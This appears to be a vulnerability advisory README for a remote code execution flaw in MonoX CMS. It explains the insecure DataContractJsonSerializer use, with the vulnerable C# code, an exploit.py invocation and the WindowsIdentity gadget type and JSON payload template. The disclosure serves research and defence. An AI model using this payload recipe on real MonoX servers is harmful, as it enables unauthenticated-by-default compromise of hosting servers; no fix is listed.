# HTML5Upload and SilverLightUploadHandler - Remote Code Execution

## VulDB-Like Summary

A vulnerability has been found in the MonoX CMS for .NET up to v5.1.40.5152. It has been rated as critical. Affected by this issue are the classes `MonoX.MonoSoftware.MonoX.HTML5Upload` and `MonoX.MonoSoftware.MonoX.SilverLightUploadHandler`. The combined manipulation of the of the **ThumbnailSizeArgs** an **ThumbnailSizeType** parameters leads to Remote Code Execution vulnerability. Using CWE to declare the problem leads to CWE-502. Impacted is Integrity and Availability. An attacker might be able execute arbitrary code within the application context, and use them to achive remote code execution within the underlying hosting server.

The weakness was presented 04/19/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-XXXX. The attack may be launched remotely. A single form of authentication is required for exploitation. Technical details are known and an exploit is publicly available.

## Proof-of-Concept

An exploit script is provided in this repository, which may be used to easily verify and exploit the vulnerability.

The script should give the following output, proving the vulnerability.

```
$ python3 exploit.py -t http://monox.local -u admin -p Passw0rd! -c calc -y path/to/ysoserial.exe
[*] Logging in
[*] Triggering RCE
[+] Success!
```

When the script finishes, a calculator should spawn in the target server.

## Walkthrough

This vulnerability was easily found through a deep code analysis. The affected code block is the following one:

```csharp
if (base.Request.Form["ThumbnailSizeArgs"] != null && base.Request.Form["ThumbnailSizeType"] != null)
    {
        try
        {
            string @string = Encoding.UTF8.GetString(Convert.FromBase64String(base.Request.Form["ThumbnailSizeType"]));
            this.ThumbnailSize = (JsonSerializer.Deserialize(Convert.FromBase64String(base.Request.Form["ThumbnailSizeArgs"]), Type.GetType(@string)) as ThumbnailSizeEventArgs);
        }
        catch (Exception logMessage)
        {
            this.log.Error(logMessage);
        }
    }
```

As observable, the JsonSerializer is deserializaing directly the request parameter `ThumbnailSizeArgs`, without any prior validation of its content.

The `JsonSerializer` object is an instance of the custom MonoX class `MonoSoftware.Core.JsonSerializer`. Studing this class, it was possible to identify the actual implementation of the Deserialize function call:

```csharp
public static object Deserialize(Stream content, Type type)
    {
        DataContractJsonSerializer dataContractJsonSerializer = new DataContractJsonSerializer(type);
        DataContractJsonSerializer dataContractJsonSerializer2;
        if (5 != 0) // Decompiled if
        {
            dataContractJsonSerializer2 = dataContractJsonSerializer;
        }
        return dataContractJsonSerializer2.ReadObject(content);
    }
```

From that, it was possible to ascertain that the deserialization routine was using `DataContractJsonSerializer`, taking `ThumbnailSizeArgs` as the seriliazed payload, and `ThumbnailSizeType` as the type to use for deserialization.

`DataContractJsonSerializer` is one of the .NET formatters that are basically secure, and usually free from deserialization issues, as it uses a strong object graph inspection, forbidding the deserialization of non-whitelisted objects. However, even `DataContractJsonSerializer` can be affected by insecure deserialization if the "Type" parameter passed to `Deserialize` is controllable by an external attacker, as this "Type" is automatically added to the whitelist. It may be obvious, but that was the case.

As no automatic payload generator was available in **ysoserial.net**, crafting the payload for this instance required a bit of manual interaction. After a bit of research, it was clear that `WindowsIdentity` was the right POP chain to use, as it supports `DataContractSerializer`, and because its payload is a "one level" XML.

```xml
<root type="System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <WindowsIdentity xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:x="http://www.w3.org/2001/XMLSchema" xmlns="http://schemas.datacontract.org/2004/07/System.Security.Principal">
      <System.Security.ClaimsIdentity.actor i:type="x:string" xmlns="">
          {base64-encoded-payload}
      </System.Security.ClaimsIdentity.actor>
       </WindowsIdentity>
</root>
```
From the XML above, it was possible to identify all the needed information to craft the final exploit:

**Type**

```
System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
```

**Payload**

Transformed in JSON format, the payload was reduced to:

```json
{"System.Security.ClaimsIdentity.actor":"[base64-encoded-payload]"}
```

Upon deserialization, it was then possible to execute arbitrary code on the underlying Windows Hosting Server.  

## Remediation

Currently, no fixes are available for this issue.

## References

*   [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
*   [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
*   [OWASP Top 10 - A8-Insecure Deserialization](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization)